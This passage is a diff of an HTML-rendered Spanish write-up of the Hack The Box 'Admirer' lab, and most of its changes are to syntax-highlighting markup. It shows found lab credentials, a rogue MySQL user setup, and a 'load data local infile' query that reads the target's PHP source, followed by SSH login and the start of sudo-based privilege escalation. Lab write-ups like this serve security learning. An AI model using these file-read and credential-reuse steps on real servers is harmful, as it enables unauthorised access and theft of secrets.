       &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Invalid task.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
     &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
-  &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;p&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;h4&amp;gt;Select task:&amp;lt;/p&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;select name=&amp;#34;task&amp;#34;&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=1&amp;gt;View system uptime&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=2&amp;gt;View logged in users&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=3&amp;gt;View crontab&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=4 disabled&amp;gt;Backup passwd file&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=5 disabled&amp;gt;Backup shadow file&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=6 disabled&amp;gt;Backup web data&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;option value=7 disabled&amp;gt;Backup database&amp;lt;/option&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;/select&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;/form&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;/body&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;/html&amp;gt;
-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+  &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
+
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Select task:&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;task&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;View system uptime&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;View logged in users&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;View crontab&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;disabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Backup passwd file&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;disabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Backup shadow file&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;disabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Backup web data&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;disabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Backup database&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/admirer/Screenshot_20200914_163022.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En este punto ya no encontramos nada interesante en la pagina ya que algunos archivos fueron reemplazados con mejores opciones como &lt;code&gt;db_admin.php&lt;/code&gt; en el que indica que implementaron una mejor alternativa de codigo abierto:&lt;/p&gt;
@@ -1933,7 +1933,7 @@ drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; kali kali 4.0K Dec  &lt;
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:db_admin.php&#34; data-lang=&#34;php:db_admin.php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:db_admin.php&#34; data-lang=&#34;php:db_admin.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
   &lt;span class=&#34;nv&#34;&gt;$servername&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;waldo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
   &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Wh3r3_1s_w4ld0?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
@@ -1949,8 +1949,8 @@ drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; kali kali 4.0K Dec  &lt;
 
 
   &lt;span class=&#34;c1&#34;&gt;// TODO: Finish implementing this or find a better open source alternative
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Utilizamos nuevamente GOBUSTER para realizar una busqueda pero esta vez en &lt;code&gt;utility-scripts&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1998,7 +1998,7 @@ create TABLE file&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;data varchar&lt;spa
 CREATE USER &lt;span class=&#34;s1&#34;&gt;&amp;#39;sckull&amp;#39;&lt;/span&gt;@&lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt; IDENTIFIED BY &lt;span class=&#34;s1&#34;&gt;&amp;#39;sckull&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 GRANT ALL PRIVILEGES ON *.* TO &lt;span class=&#34;s1&#34;&gt;&amp;#39;sckull&amp;#39;&lt;/span&gt;@&lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 FLUSH PRIVILEGES&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;c1&#34;&gt;#Test &lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#Test&lt;/span&gt; 
 mysql -h 10.10.10.10 -u sckull -p sckull
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
@@ -2012,9 +2012,9 @@ mysql -h 10.10.10.10 -u sckull -p sckull
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash:admirer.php&#34; data-lang=&#34;bash:admirer.php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;load&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;infile&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admirer.php&amp;#39;&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt;
-&lt;span class=&#34;nx&#34;&gt;fields&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;terminated&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash:admirer.php&#34; data-lang=&#34;bash:admirer.php&#34;&gt;load data local infile &amp;#39;admirer.php&amp;#39;
+into table file
+fields terminated by &amp;#39;\n&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/admirer/Screenshot_20200914_171646.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -2031,20 +2031,20 @@ mysql -h 10.10.10.10 -u sckull -p sckull
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:index.php&#34; data-lang=&#34;php:index.php&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:index.php&#34; data-lang=&#34;php:index.php&#34;&gt;[... REDACTED ...]
 
-&lt;span class=&#34;nv&#34;&gt;$servername&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;waldo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;nv&#34;&gt;$dbname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admirerdb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+$servername = &amp;#34;localhost&amp;#34;;
+$username = &amp;#34;waldo&amp;#34;;
+$password = &amp;#34;&lt;span class=&#34;ni&#34;&gt;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&amp;#34;;&lt;/span&gt;
+$dbname = &amp;#34;admirerdb&amp;#34;;
 
-&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+[... REDACTED ...]
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;waldo---user&#34;&gt;WALDO - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;waldo---user-&#34;&gt;WALDO - USER&lt;/h2&gt;
 &lt;p&gt;Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/admirer/Screenshot_20200914_172008.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos para ejecutar el comando &lt;code&gt;/opt/scripts/admin_tasks.sh&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/admirer/Screenshot_20200914_172249.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;El archivo &lt;code&gt;admin_tasks.sh&lt;/code&gt; realiza un backup de diferentes archivos como /etc/passwd, /etc/shadow, pero algo interesante es de que realiza la ejecucion de un script en python.&lt;/p&gt;
